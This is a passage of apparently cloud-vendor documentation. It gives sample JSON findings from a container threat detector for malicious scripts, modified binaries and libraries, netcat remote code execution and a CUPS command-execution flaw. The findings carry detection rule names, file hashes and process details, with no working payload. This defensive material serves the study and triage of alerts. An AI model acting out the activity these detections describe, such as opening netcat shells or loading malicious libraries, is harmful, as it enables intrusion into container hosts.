          "primaryTechniques": [
            "COMMAND_AND_SCRIPTING_INTERPRETER",
            "PYTHON"
          ],
          "additionalTactics": [
            "COMMAND_AND_CONTROL"
          ],
          "additionalTechniques": [
            "INGRESS_TOOL_TRANSFER"
          ]
        },
        "mute": "UNDEFINED",
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "3492656",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "3492656",
              "partiallyHashed": false,
            },
            "script": {
              "path": "FILENAME",
              "size": "4191",
              "sha256": "SHA_256",
              "hashedSize": "4096",
              "partiallyHashed": true,
              "contents": "\"#!/usr/bin/env python\\n\\nimport uuid\\nimport subprocess\\nimport os\\nimport sys\\nsys.exit(0)…",
            },
            "args": [
              "INTERPRETER",
              "FILENAME"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"CONTAINER_NAME\""
              },
            ],
            "pid": "7",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "severity": "CRITICAL",
        "state": "ACTIVE",
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "Process_Arguments": [
          "INTERPRETER",
          "FILENAME"
        ],
        "VM_Instance_Name": "INSTANCE_ID",
        "Process_Binary_Fullpath": {
            "primitiveDataType": "STRING"
          },
        "description": "A machine learning model using Natural Language Processing techniques identified an executed python script as malicious.",
        "Container_Creation_Timestamp": {
          "seconds": 1718650213,
          "nanos": 0
        },
        "Pod_Name": "CONTAINER_NAME",
        "Container_Image_Uri": "CONTAINER_IMAGE_URI",
        "Container_Image_Id": "CONTAINER_IMAGE_ID",
        "Parent_Pid": 1,
        "Container_Name": "CONTAINER_NAME",
        "Pid": 7,
        "Process_Creation_Timestamp": {
          "seconds": 1718650213,
          "nanos": 762524370
        },
        "Environment_Variables": [
        ],
        "Pod_Namespace": "default"
      }
    }
    
      

#### Execution: Modified Malicious Binary Executed
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
        "category": "Execution: Modified Malicious Binary Executed",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_URI",
            "imageId": "CONTAINER_IMAGE_ID"
          }
        ],
        "createTime": "2023-11-13T21:38:51.893Z",
        "database": {},
        "eventTime": "2023-11-13T21:38:51.525Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "default",
              "containers": [
                    {
                      "name": "CONTAINER_NAME",
                      "uri": "CONTAINER_URI",
                      "imageId": CONTAINER_IMAGE_ID"
                    }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE"
            }
          ]
        },
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "NATIVE_API"
          ]
        },
        "mute": "UNDEFINED",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/malicious_files/file_to_be_modified\"",
              "size": "68",
              "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
              "hashedSize": "68",
              "partiallyHashed": false
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false
            },
            "args": [
              "\"/malicious_files/file_to_be_modified\"",
              "\"modified-malicious-binary-da2a7b72e6008bc3\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://10.77.124.129:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-modified-malicious-binary\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"10.77.124.129\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"DEBIAN_FRONTEND\"",
                "val": "\"noninteractive\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://10.77.124.129:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"10.77.124.129\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/malicious_files\""
              }
            ],
            "pid": "8",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "display_name": "CLUSTER_ID",
        "project_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "project_display_name": "PROJECT_ID",
        "parent_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parent_display_name": "PROJECT_ID",
        "type": "google.container.Cluster",
        "folders": []
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "modified_malicious_binary_executed"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1699905066",
                "nanos": 618571329
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1106/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal IP Link",
              "url": "https://www.virustotal.com/gui/file/275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f/detection"
            }
          ],
          "cloudLoggingQueryUri": [
            {
              "displayName": "Cloud Logging Query Link",
              "url": "https://console.cloud.google.com/logs/query;query=timestamp%3D%222023-11-13T21:38:39.084524438Z%22%0AinsertId%3D%22%22?project=PROJECT_NUMBER"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
      

#### Execution: Modified Malicious Library Loaded
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
        "category": "Execution: Modified Malicious Library Loaded",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_URI",
            "imageId": "CONTAINER_IMAGE_ID"
          }
        ],
        "createTime": "2023-11-13T21:38:55.271Z",
        "database": {},
        "eventTime": "2023-11-13T21:38:55.133Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "default",
              "containers": [
                    {
                      "name": "CONTAINER_NAME",
                      "uri": "CONTAINER_URI",
                      "imageId": CONTAINER_IMAGE_ID"
                    }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE"
            }
          ]
        },
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "SHARED_MODULES"
          ]
        },
        "mute": "UNDEFINED",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/malicious_files/drop_mal_lib\"",
              "size": "5005064",
              "sha256": "fe2e70de9f77047d3bf5debe3135811300c9c69b937b7fd3e2ca8451a942d5fb",
              "hashedSize": "5005064",
              "partiallyHashed": false
            },
            "libraries": [
              {
                "path": "\"/malicious_files/file_to_be_modified\"",
                "size": "68",
                "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
                "hashedSize": "68",
                "partiallyHashed": false
              }
            ],
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false
            },
            "args": [
              "\"/malicious_files/drop_mal_lib\"",
              "\"/malicious_files/file_to_be_modified\"",
              "\"/tmp/modified-malicious-library-430bbedd7049b0d1\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://10.77.124.129:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-modified-malicious-library\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"10.77.124.129\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"DEBIAN_FRONTEND\"",
                "val": "\"noninteractive\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://10.77.124.129:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"10.77.124.129\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/malicious_files\""
              }
            ],
            "pid": "8",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "display_name": "CLUSTER_ID",
        "project_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "project_display_name": "PROJECT_ID",
        "parent_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parent_display_name": "PROJECT_ID",
        "type": "google.container.Cluster",
        "folders": []
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "modified_malicious_library_loaded"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1699911519",
                "nanos": 124151422
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1129/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal IP Link",
              "url": "https://www.virustotal.com/gui/file/275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f/detection"
            }
          ],
          "cloudLoggingQueryUri": [
            {
              "displayName": "Cloud Logging Query Link",
              "url": "https://console.cloud.google.com/logs/query;query=timestamp%3D%222023-11-13T21:38:39.124151422Z%22%0AinsertId%3D%22%22?project=PROJECT_NUMBER"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
      

#### Execution: Netcat Remote Code Execution in Container
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Netcat Remote Code Execution in Container",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "ESCAPE_TO_HOST"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-netcat-remote-code-execution-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "LOW",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_netcat_remote_code_execution_in_container"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1059/004/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/430cdef8f363efe8b7fe0ce4af583b202b77d89f0ded08e3b77ac6aca0a0b304/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Execution: Possible Arbitrary Command Execution through CUPS (CVE-2024-47076)
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Possible Arbitrary Command Execution through CUPS (CVE-2024-47076)",
        "chokepoint": {},
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2025-07-22T00:07:48Z"
          }
        ],
        "createTime": "2025-07-22T00:07:54.853Z",
        "database": {},
        "dataProtectionKeyGovernance": {},
        "eventTime": "2025-07-22T00:07:54.627Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/770715367326",
              "timestamp": "2025-07-22T00:07:48.052030557Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "EXPLOITATION_FOR_CLIENT_EXECUTION"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/bin/dash\"",
              "size": "121432",
              "sha256": "2fdc4546e1f425bcaf62624a7118fd4ba86c11e6277e8b9ee63263eb0dcbc6c5",
              "hashedSize": "121432",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"sh\"",
              "\"-c\"",
              "\"echo\"",
              "\"hello\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"_\"",
                "val": "\"/bin/sh\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-cups-2025-07-22-00-07-44-utc\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"DEBIAN_FRONTEND\"",
                "val": "\"noninteractive\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"SHLVL\"",
                "val": "\"2\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              }
            ],
            "pid": "9",
            "parentPid": "8",
            "userId": "0"
          },
          {
            "binary": {
              "path": "\"foomatic-rip\"",
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "argumentsTruncated": false,
            "pid": "0",
            "parentPid": "0",
            "userId": "0"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_possible_arbitrary_command_execution_through_cups"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0002/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/2fdc4546e1f425bcaf62624a7118fd4ba86c11e6277e8b9ee63263eb0dcbc6c5/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
        

#### Execution: Possible Remote Command Execution Detected ([Preview](https://cloud.google.com/products/#product-launch-stages))
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Possible Remote Command Execution Detected",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "COMMAND_AND_SCRIPTING_INTERPRETER"
          ],
          "additionalTactics": [
            "COMMAND_AND_CONTROL"
